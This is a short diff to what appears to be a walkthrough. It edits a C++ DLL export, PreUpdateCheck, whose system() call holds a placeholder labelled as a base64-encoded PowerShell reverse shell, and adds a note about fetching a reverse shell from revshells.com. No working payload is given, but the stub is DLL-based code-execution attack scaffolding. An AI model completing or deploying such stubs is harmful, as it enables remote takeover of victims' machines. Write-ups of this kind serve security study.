@@ -412,7 +412,7 @@ extern "C" {
     __declspec(dllexport) void PreUpdateCheck() {
         // Your code execution payload goes here
         // Example: Spawning a command or reverse shell
-        system("<powershell base64 encoded >");
+        system("<powershell base64 encoded reverse shell>");
     }
 }
 
@@ -429,5 +429,9 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
 }
 ```
 
+Ill get a powershell reverse shell from revshells.com then place it in the code
 
+```python
+
+```
 
